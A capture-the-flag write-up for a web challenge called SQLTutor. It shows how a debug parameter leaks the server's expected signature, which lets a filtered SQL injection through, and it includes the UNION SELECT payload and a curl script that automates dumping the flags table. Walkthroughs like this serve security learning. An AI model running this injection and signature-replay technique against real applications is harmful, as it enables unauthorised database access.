# Challenge: SQLTutor

## Category: WEB

The challenge was quite good because it was simple but not a 'throw-sqlmap-and-pray' task. The goal was to get a flag stored in the DB.

You face a website that takes user input and after 2 steps submit a query into a database. The player can choose the base query from a menu, some query examples are: 

```sql
SELECT * FROM users WHERE users.name='{input}'

SELECT * FROM users WHERE users.name !='{input}'

SELECT u.*, COUNT(c.id) as `rich meter` FROM users u JOIN cars c ON c.ownerID=u.id WHERE u.name='{input}' GROUP BY u.id

# ... and more
```

The first query is already suitable for SQL Injection using : ```' UNION <payload> -- -```. The challenge was not that easy - this payload fails and a popup appears to notify the player.

Let's look at the requests when every input is submitted:
```
POST /verify_and_sign_text

POST /execute
```

The javascript source code helps:
```js
$(() => {
  const executeQuery = (text, signature, queryNo) => {
    // text here is base64 encoded
    // signature confirms, that there is nothing malicious in the text
    // queryNo is used to identify the query that will be executed
    $.ajax({
      url: "/execute",
      method: "POST",
      data: {
        // Backend devs said that the text should be base64 encoded
        text, // must be base64
        signature, // must be sha1
        queryNo,
        //debug:true - commented parameter
      },
    }).done((data) => {
      if (data.status === "ok") {
        //Write query to pre in html

        // < RENDERING CODE CUT >

	// Because people continously try to break the app,
    // we need to make sure that the text is checked and signed
    $.ajax({
      type: "POST", // request type
      url: "/verify_and_sign_text",
      data: {
        // Backend devs said that the query should be base64 encoded
        text: btoa(contents),
        alg: "sha1",
        //debug:true - commented parameter
      },
    })
      .done((data) => {
        if (data.status === "ok") {
          // Overwrite sanitized query
          $("#query_text").val(atob(data.trimmedText));
          executeQuery(data.trimmedText, data.signature, queryNo); // /execute POST call
        } else {
          alert("Error: " + data.message);
        }
      })
      .catch((errdata) => {
        console.error(errdata);
      });
```

The first endpoint rejects every input that has harmful chars - ie ```& ' " -``` and creates a signature of our input encoded as base64 using ```btoa()``` function.
An interesting part is the signature beacuse at a closer look is not the standard ```sha1(btoa(input));```. Here an example:
```bash
# sha1 generated by myself
echo -n "JyBVTklPTiBTRUxFQ1QgKiwzLDQgRlJPTSBmbGFncyAtLSAt=" | sha1deep # 5f1f53293a30c59e4288de6c596dbf3bc4ab3048

# sha1 from the challenge - 5b023c3589475b9f62a7c029374b404c99465f5c

>>> "5f1f53293a30c59e4288de6c596dbf3bc4ab3048" == "5b023c3589475b9f62a7c029374b404c99465f5c" # False
```
Another step that i did was to use ```debug param``` but in ```/verify_and_sign_text``` doesn't hold much infos. It confirms the sha1 secret.
```bash
URL='https://sqltutor.dragonsec.si/verify_and_sign_text'
url -s $URL -X POST  -H 'Content-Type: application/x-www-form-urlencoded'  --data-raw 'text=ZGRk&alg=sha1&debug=true' | jq

"Created signature: sha1(secret+sanitize(text)) âœ…"
```

At this step the attacker doesn't have enough info to solve the challenge so it's to time to go towards ```/execute```. The player control 4 parameter:

+ ```queryNo``` an integer from the drop-down menu
+ ```text``` base64 payload
+ ```signature``` sha1 signature
+ ```debug``` parameter

The ```queryNo``` is well checked, it accepts only integers > 0 and < max_index. The ```text``` field has a base64 string and different encoding won't help the player this time. ```signature``` is unknown because of the secret. But ```debug``` is worth to see this time. **The response leak information about the compare operation between signatures**:

```bash
"status":"error",
"message":"Invalid text signature, this incident will be reported!",
"compare":"5b023c3589475b9f62a7c029374b404c99465f5c !== 82a43266bebaf4ebfd7dec31f2f874e7be606511"}
```

At this point recap:

+ the player controls the base64 payload. It that can be custom created bypassing validation filter.
+ with a request a correct signature is leaked, and the next request will be valid.

Put everything together and get the flag. An important step before the flag is to enumerate the DB.

```bash
# winning payload
curl -s $URL -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
	--data-raw 'text=JyBVTklPTiBTRUxFQ1QgKiwzLDQgRlJPTSBmbGFncyAtLSAt=&signature=5b023c3589475b9f62a7c029374b404c99465f5c&queryNo=0&debug=true' 
```

It's easier with a script that automatize everything.
```bash
URL='https://sqltutor.dragonsec.si/execute'

# 4 output cols and i assumed just id,flag in the table
# enum part confirms it
PAYLOAD="' UNION SELECT *,3,4 FROM flags -- -" 
TEXT=$(echo -n $PAYLOAD | base64 -w0)
FSIG=$(echo -n $TEXT | sha1deep)

# cut used to split on ! char - ["5b023c3589475b9f62a7c029374b404c99465f5c ", !== " 5b023c3589475b9f62a7c029374b404c99465f5c"]
# sed is used to remove trailing space and double quote
RSIG=$(curl -s $URL -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
	--data-raw "text=$TEXT=&signature=$FSIG&queryNo=0&debug=true" | jq ".debug.compare" | cut -f1 -d '!' | sed -E 's/"| //g')

curl -s $URL -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
	--data-raw "text=$TEXT=&signature=$RSIG&queryNo=0&debug=true" | jq
```